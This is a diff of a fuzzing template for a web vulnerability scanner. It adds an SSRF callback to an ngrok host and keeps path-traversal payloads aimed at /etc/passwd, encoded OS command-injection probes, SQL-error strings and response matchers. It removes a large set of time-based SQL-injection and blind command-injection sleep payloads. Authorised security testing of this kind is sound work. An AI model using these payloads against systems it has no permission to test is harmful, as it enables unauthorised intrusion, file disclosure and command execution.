@@ -12,7 +12,8 @@ type: fuzz
 payloads:
 
 # SSRF
-  - 'Your Server Here'
+  - 'http://ba668f41.ngrok.io/ssrf.txt'
+  - 'ba668f41.ngrok.io'
 
 # SQLi Errors
   - '''"'
@@ -50,106 +51,6 @@ payloads:
   - '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
   - '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd'
 
-# SQLi Time Based
-  - sleep(5)#
-  - 3 or sleep(5)#
-  - \" or sleep(5)#
-  - \' or sleep(5)#
-  - \" or sleep(5)=\"
-  - \' or sleep(5)=\'
-  - 3) or sleep(5)#
-  - \") or sleep(5)=\"
-  - \') or sleep(5)=\'
-  - 3)) or sleep(5)#
-  - \")) or sleep(5)=\"
-  - \')) or sleep(5)=\'
-  - ;waitfor delay \'0:0:5\'--
-  - );waitfor delay \'0:0:5\'--
-  - \';waitfor delay \'0:0:5\'--
-  - \";waitfor delay \'0:0:5\'--
-  - \');waitfor delay \'0:0:5\'--
-  - \");waitfor delay \'0:0:5\'--
-  - ));waitfor delay \'0:0:5\'--
-  - \'));waitfor delay \'0:0:5\'--
-  - \"));waitfor delay \'0:0:5\'--
-  - benchmark(30000000,MD3(5))#
-  - 3 or benchmark(30000000,MD5(5))#
-  - \" or benchmark(30000000,MD5(5))#
-  - \' or benchmark(30000000,MD5(5))#
-  - 3) or benchmark(30000000,MD5(5))#
-  - \") or benchmark(30000000,MD5(5))#
-  - \') or benchmark(30000000,MD5(5))#
-  - 3)) or benchmark(30000000,MD5(5))#
-  - \")) or benchmark(30000000,MD5(5))#
-  - \')) or benchmark(30000000,MD5(5))#
-  - pg_sleep(5)--
-  - 3 or pg_sleep(5)--
-  - \" or pg_sleep(5)--
-  - \' or pg_sleep(5)--
-  - 3) or pg_sleep(5)--
-  - \") or pg_sleep(5)--
-  - \') or pg_sleep(5)--
-  - 3)) or pg_sleep(5)--
-  - \")) or pg_sleep(5)--
-  - \')) or pg_sleep(5)--
-  - AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND \'vRxe\'=\'vRxe
-  - AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND \'%\'=\'
-  - AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
-  - AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
-  - AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
-  - SLEEP(5)#
-  - SLEEP(5)--
-  - SLEEP(5)=\"
-  - SLEEP(5)=\'
-  - or SLEEP(5)
-  - or SLEEP(5)#
-  - or SLEEP(5)--
-  - or SLEEP(5)=\"
-  - or SLEEP(5)=\'
-  - waitfor delay \'00:00:05\'
-  - waitfor delay \'00:00:05\'--
-  - waitfor delay \'00:00:05\'#
-  - benchmark(30000000,MD5(5))
-  - benchmark(30000000,MD5(5))--
-  - benchmark(30000000,MD5(5))#
-  - or benchmark(30000000,MD5(5))
-  - or benchmark(30000000,MD5(5))--
-  - or benchmark(30000000,MD5(5))#
-  - pg_SLEEP(5)
-  - pg_SLEEP(5)--
-  - pg_SLEEP(3)#
-  - or pg_SLEEP(5)
-  - or pg_SLEEP(5)--
-  - or pg_SLEEP(5)#
-  - AnD SLEEP(5)
-  - AnD SLEEP(5)--
-  - AnD SLEEP(5)#
-  - \&\&SLEEP(5)
-  - \&\&SLEEP(5)--
-  - \&\&SLEEP(5)#
-  - \' AnD SLEEP(5) ANd \'3
-  - \'&&SLEEP(5)&&\'3
-  - ORDER BY SLEEP(5)
-  - ORDER BY SLEEP(5)--
-  - ORDER BY SLEEP(5)#
-  - (SELECT * FROM (SELECT(SLEEP(5)))ecMj)
-  - (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
-  - (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
-  - +benchmark(3200,SHA3(5))+\'
-  - + SLEEP(5) + \'
-  - RANDOMBLOB(100000000/2)
-  - AND 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(100000000/2))))
-  - OR 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(100000000/2))))
-  - RANDOMBLOB(1000000000/2)
-  - AND 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(1000000000/2))))
-  - OR 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(1000000000/2))))
-  - SLEEP(5)/*\' or SLEEP(5) or \'\" or SLEEP(5) or \"*/
-
-# SQLI Time Based Pologlot
-  - SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
-  - SLEEP(5) /*‘ or SLEEP(5) or ‘“ or SLEEP(5) or “*/
-  - IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(5)))OR"*/
-
 # OS Comman Injection:
   - 'echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
   - '%20echo%20TDJHRY$((282037%2B31337))$(echo%20TDJHRY)TDJHRY'
@@ -165,22 +66,8 @@ payloads:
   - '%7Cecho%20IRODNG$((282037%2B31337))$(echo%20IRODNG)IRODNG'
   - '%7C%7Cecho%20KRCSNE$((282037%2B31337))$(echo%20KRCSNE)KRCSNE'
 
-# Blind Time Based OS Command Injection
-  - 'sleep%205'
-  - '%20sleep%205'
-  - ';sleep%205'
-  - '&sleep%205'
-  - '|sleep%205'
-  - '||sleep%205'
-  - '&&sleep%205'
-  - '%0asleep%205'
-  - '%3Bsleep%205'
-  - '%26sleep%205'
-  - '%26%26sleep%205'
-  - '%7Csleep%205'
-  - '%7C%7Csleep%205'  
-
 requests:
+  - redirect: true
   - generators:
       - Query("{{.payload}}")
       - Path("{{.payload}}", "*")
@@ -192,15 +79,15 @@ requests:
       - >-
         StringSearch("response", "boot loader") 
       - >-
-        StringSearch("response", "location: Your Server")
+        StringSearch("response", "location: http://657690a7.ngrok.io")
       - >-
-        StringSearch("response", "ssrf detected")
+        StringSearch("response", "ssrfhere")
       - >-
         StringSearch("response", "<xssHere>")
       - >-
         StringSearch("response", "'-confirm`1`-'") || StringSearch("response", '"-confirm`1`-"')
       - >-
-        StringSearch("response", "set-cookie: crlf=inject")  
+        StringSearch("resHeader", "set-cookie: crlf=inject")  
       - >-
         StringSearch("response", '&lt;/font&gt;&lt;font face="Arial" size=2&gt;')
       - >-
@@ -393,7 +280,5 @@ requests:
         StringSearch("response", "You have an error in your SQL syntax")
       - >- 
         StringSearch("response", "313374")
-      - >-
-        ResponseTime() > 5
         
 
